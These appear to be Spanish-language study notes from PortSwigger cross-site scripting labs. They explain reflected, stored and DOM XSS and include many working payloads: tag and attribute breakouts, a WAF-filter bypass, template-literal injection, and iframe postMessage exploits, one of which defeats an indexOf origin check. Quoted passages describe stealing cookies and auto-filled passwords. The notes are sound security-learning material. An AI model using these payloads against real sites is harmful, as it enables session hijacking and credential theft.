# Cross Site Scripting

Existen basicamente 3 tipos de XSS

# XSS reflejado (Reflected cross-site scripting)
Donde el script malicioso proviene de la solicitud HTTP actual.

> XSS Reflejado: la aplicación utiliza datos sin validar, suministrados por un usuario y codificados como parte del HTML o
> JavaScript de salida. Un ejemplo de este tipo de XSS podría ser, si al introducir código JavaScript 
> en el buscador de una página, este código es ejecutado en el navegado

## Cross-site scripting contexts

Donde se aparece la informacion que podemos manipular y por lo tanto un script que inyectar

> The location within the response where attacker-controllable data appears.
> Any input validation or other processing that is being performed on that data by the application

### XSS between HTML tags

```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>

```

Cuando los angle brakets estan  bloqueados

```

" autofocus onfocus=alert(document.domain) x="

```
> The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=" to gracefully repair the following markup.


### HREF atribute

```

<a href="javascript:alert(document.domain)">

```

### Inside a script

```
<script>
...
var input = 'controllable data here';
...
</script>

```
Para explotar este podrias una img para ejecutar tu propio script

```

</script><img src=1 onerror=alert(document.domain)>

```

### XSS in HTML tag attributes

>  close the tag, and introduce a new one.

```

"><script>alert(document.domain)</script>

```

### Breaking out of a JavaScript string

> In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.

```
'-alert(document.domain)-'
';alert(document.domain)//
```

### Angle Brackets encoded

por ejemplo al estar dentro de un script podrias cerrar las comillas y generar algo como esto

```
var a = ''-alert(1)-''

```

Cuando te encuentras detras de un WAF podrias tener caracteres restringidos para eso se usa 

```

onerror=alert;throw 1

```

#### throw

Lanza una excepcion definida por el usuario.

Por ejemplo:

```

throw "Error2"; // genera una excepción con un valor cadena
throw 42; // genera una excepción con un valor 42
throw true; // genera una excepción con un valor true

```

### Usando el URL encode

For example, if the XSS context is as follows:

```
<a href="#" onclick="... var input='controllable data here'; ...">
```
```

&apos;-alert(document.domain)-&apos;

````

### Contexto de Plantillas literales ( JavaScript template literals )

> Las plantillas literales son cadenas literales que habilitan el uso de expresiones incrustadas. Con ellas, es posible utilizar cadenas de caracteres de más de una línea, y funcionalidades de interpolación de cadenas de caracteres.

```
`texto de cadena de caracteres`

`línea 1 de la cadena de caracteres
 línea 2 de la cadena de caracteres`

`texto de cadena de caracteres ${expresión} texto adicional`

etiqueta`texto de cadena de caracteres ${expresión} texto adicional`

````

For example, the following script will print a welcome message that includes the user's display name:

```

document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;

``` 

```
<script>
...
var input = `controllable data here`;
...
</script>

```

```
${alert(document.domain)}

```
y se ejcutaria el codigo js

### XSS in the context of the AngularJS sandbox (pendiente hasta que no domines mas esto

# XSS almacenado (Stored cross-site scripting)

Donde el script malicioso proviene de la base de datos del sitio web. 

> XSS Almacenado: la aplicación almacena datos proporcionados por el usuario sin validar ni sanear, los que posteriormente son visualizados por otro usuario o un administrador. Una página web sería vulnerable a este tipo de XSS si por ejemplo un usuario introduce como dirección de entrega código JavaScript 
> y este código se ejecuta cuando un empleado accede al perfil del usuario.

## Vectores  de   Ataque

### Exploiting cross-site scripting to steal cookies

Limittaciones

>  In practice, this approach has some significant limitations:  
>  The victim might not be logged in.
Many applications hide their cookies from JavaScript using the HttpOnly flag.
Sessions might be locked to additional factors like the user's IP address.
The session might time out before you're able to hijack it.


### Exploiting cross-site scripting to capture passwords

> These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password.


### Exploiting cross-site scripting to perform CSRF

> Anything a legitimate user can do on a web site, you can probably do too with XSS. Depending on the site you're targeting, you might be able to make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin.


# XSS basado en DOM(DOM-based cross-site scripting)

Donde la vulnerabilidad existe en el código del lado del cliente en lugar del código del lado del servidor.


> XSS Basados en DOM: la aplicación procesa datos controlables por el usuario de forma insegura.  De forma similar al XSS Reflejado, un ejemplo de este ataque sería si en la URL escribimos código JavaScript y la web tiene un script que añade la URL sin sanear como parte del HTML. Al cargar la web el código JavaScript se ejecutará. La diferencia de este tipo de XSS con el XSS reflejado es que si miramos el código no veremos el JavaScript directamente en el HTML ya que todo sucede en el DOM.


## DOM vs BOM ( window.location)

> DOM significa modelo de objeto de documento ... cuando se carga la página web, el navegador crea un modelo de objeto de documento para la página ... Todos los objetos se organizan como estructura de árbol ...

> BOM significa que el objeto Browser Object Model.window es compatible con todos los navegadores que representan el navegador de ventanas. Todos los objetos, funciones y variables globales de JavaScript se convierten automáticamente en miembros del objeto de ventana.


> El objeto document es el único que pertenece tanto al DOM (como se vio en el capítulo anterior) como al BOM. Desde el punto de vista del BOM, el objeto document proporciona información sobre la propia página HTML.

> BOM significa Modelo de Objeto del Navegador. Estos son objetos que puede utilizar para manipular el navegador. ellos son navegantes

1. navegador
2. pantalla
3. ubicación
4. historia
5. documento

 Ejemplo 
 
 The window.location.href property returns the URL of the current page.
 
 

# Ejemplos Laboratorios

## Reflected XSS into HTML context with nothing encoded

En este caso el payload mas basico es 

><script>alert(1)</script>

Tambien ahora que mataron alert se puede usar 

><script>print(1)</script>

## Dominio que ejecuta

Para saber cual es el dominio que ejecuta el alert puedes usar

> alert(document.domain)

Para evitar que roben las cookies:

>Many applications hide their cookies from JavaScript using the HttpOnly flag.


### POC

Un atacante pasaria este link

> https://insecure-website.com/status?message=<script>/
 +Bad+stuff+here...+*/</script>
> <p>Status: <script>/* Bad stuff here... */</script></p>


## DOM XSS in document.write sink using source

Para este caso insertamos un string en el cuadro de busqueda ej. 'abcd1234' le damos entrer
y nos muestra eso mismo en un cuadro de h1(o paecido )clic derecho inspeccionar
y nos dirigimos a buscar ese mismo string nos percatamos que:

```
<img src="/resources/images/tracker.gif?searchTerms=abcd1234">

```

### Gráficos HTML SVG

> El elemento HTML <svg>es un contenedor para gráficos SVG.
> SVG tiene varios métodos para dibujar rutas, cuadros, círculos, texto e imágenes gráficas.


Entonces quiza podamos cerrar la consulta y ademas inctar un codigo

```
"><svg onload=alert(1)>
  
```

entoces este cuando recargues la pagina va a mostrar el 1 
  
  
## Lab: DOM XSS in innerHTML sink using source location.search
  
  > This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

> To solve this lab, perform a cross-site scripting attack that calls the alert function.
  
  Para este caso nos indica que el xss se encuentra en una parte del codigo donde se genera mediante 
  innerHTML buscando un poco nos damos cuenta que la vulnerabilidad reside aqui:
  
  ```
  <span>abcd1234</span>
  
  ```
  
  ### Span 
  
Definición span - abarcar. Es un contenedor en línea. Sirve para aplicar estilo al texto o agrupar elementos en línea.
  
Se inyecta un fragmento para que quede dentro del span pero queremos que cause error y ejecute el 1 puede ser con print o con alert 
  
```
  <img src=1 onerror=alert(1)>
  
  Como quedaria por dentro ( no lo verias)
  
  <span> <img src=1 onerror=alert(1)> </span>
  
```  
  
Ya que el la sintaxis de src da error se ejecuta el alert.
  
# XSS DOM with web Messages
 
 Los WEB Messages son una manera en que las paginas se  comunican entre si y se originaron debido a que al bloquear el XSS se restringio la cominicacion y es por
 eso que se inventaron.
 
 ## Window.postMessage()
 
 > The window.postMessage() method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it.
 
 > Beware: If “*” is used as targetOrigin, the message could be from anyone.
 In other words, we may want to send a message from https://abcd.com to https://defg.com. So targetOrigin would be https://defg.com. and the recipient’s domain would be https://defg.com as well.
 
 postMessage cuenta con 2 argumentos el mensaje y el origen cuanod no se especifica que origen se pone un * por ejemplo:
 
 ```
 iframe.contentWindow.postMessage(this.message.value, '*');
 ```
 
 > Referencia https://javascript.plainenglish.io/javascript-and-window-postmessage-a60c8f6adea9
 
 # Cross-window communication
 
 Esta es una proteccion llamada “Same Origin” lo que hace es: ***( bastante bien explicado)***
 
 > The idea is that if a user has two pages open: one from john-smith.com, and another one is gmail.com, then they wouldn’t want a script from john-smith.com to read our mail from gmail.com. So, the purpose of the “Same Origin” policy is to protect users from information theft.
 
Ejemplo
 
 > Two URLs are said to have the “same origin” if they have the same protocol, domain and port.
 ```

http://site.com
http://site.com/
http://site.com/my/page.html

 ```
 > Fuente: https://javascript.info/cross-window-communication
 > Normally, scripts on different pages are allowed to access each other if and only if the pages they originate from share the same protocol, port number, and host (also known as the "same-origin policy"). window.postMessage() provides a controlled mechanism to securely circumvent this restriction (if used properly).
 
 
 ```
 <iframe src="https://0a75006d04c0febcc05d5307001c00e0.web-security-academy.net/" 
 onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
  
  ```
 
  El codigo vulnerable es el siguiente
  
  ```
  <script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
  
  ```
  
  >As the event listener does not verify the origin of the message, and the postMessage() method specifies the targetOrigin "*", the event listener accepts the payload and passes it into a sink, in this case, the eval() function.
  
  
##  DOM XSS using web messages and a JavaScript URL 
  
### Window location.href
  
  Regresa la url entra de la pagina ve este ejemplo
  
  ```
  <!DOCTYPE html>
<html>
<body>

<h1>The Window Location Object</h1>
<h2>The href Property</h2>

<p id="demo"></p>

<script>
let url = location.href;
document.getElementById("demo").innerHTML = url;
</script>

</body>
</html>

  ```
  
  el resultado es 
  
  ```
  https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_loc_href
  
  ````
Osea que pasaria cualquier url en donde se esta cargando en este caso use esta referencia
  
 > https://www.w3schools.com/jsref/prop_loc_href.asp
  
Como ultimo ejercicio poner ***location.href*** en la consola para que te regrese la pagina donde estas.
  
  ###  indexOf()  
  
Busca un string dentro de una cadena y regresa su index si lo encuentra para este ejemplo se usa para intentar proteger el codigo siguiente
verifica si el origen tiene ese string si lo tiene ejecuta la data que se envia de postmessage de otra manera no.
  
```
  window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
  
```
  
Para pasar esta proteccion basta con cumplir la condicion e inyectar nuestro payload
  
  ```
  <iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
   
   ```
   
   Ponen el //http para cumplir la condicion del indexOf y pasar las protecciones el mensaje pasara y sera ejecutado al momento en que se actualiza el 
   location.href.
   
   
# DOM XSS using web messages and JSON.parse
   
   Para este laboratorio se usa de nuevo los mensajes y se inspecciona el codgigo y nos damos cuenta que se podria ejecutar JS Nota: e visto que siempre
   que se ve algo asi " ACMEplayer.element.src = d.url;" se puede ejecutar.
   
   ```
   <iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
   ```
   
   el nodo de JSON padre es el type y en los hijos es donde podemos inyectar el codigo cabe destacar que la comilla simple no se escapa en JSON sin enmbargo la comillas dobles si de esta maneta \" es por eso que el payload.
    
> https://stackoverflow.com/questions/2275359/jquery-parsejson-throws-invalid-json-error-due-to-escaped-single-quote-in-json/2275428#2275428
    
# DOM-based open redirection
    
    Este no lo entendi bien investigar
    
```
 https://your-lab-id.web-security-academy.net/post?postId=4&url=https://your-exploit-server-id.web-security-academy.net/
    
```    
    
## Referencias

> https://portswigger.net/web-security/cross-site-scripting

> https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
  
  
